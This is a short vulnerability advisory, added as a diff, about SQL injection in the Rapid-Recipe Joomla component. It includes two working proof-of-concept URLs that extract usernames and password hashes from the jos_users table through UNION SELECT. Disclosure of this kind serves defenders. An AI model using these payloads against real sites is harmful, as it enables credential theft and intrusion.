@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/27724/info
+
+Rapid-Recipe is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/index.php?option=com_rapidrecipe&page=showuser&user_id=-1+union+all+select+concat(username,0x3a,password)+from+jos_users+limit+0,20--
+http://www.example.com/index.php?option=com_rapidrecipe&page=viewcategorysrecipes&category_id=-1+union+all+select+concat(username,0x3a,password),2+from+jos_users+limit+0,20-- 
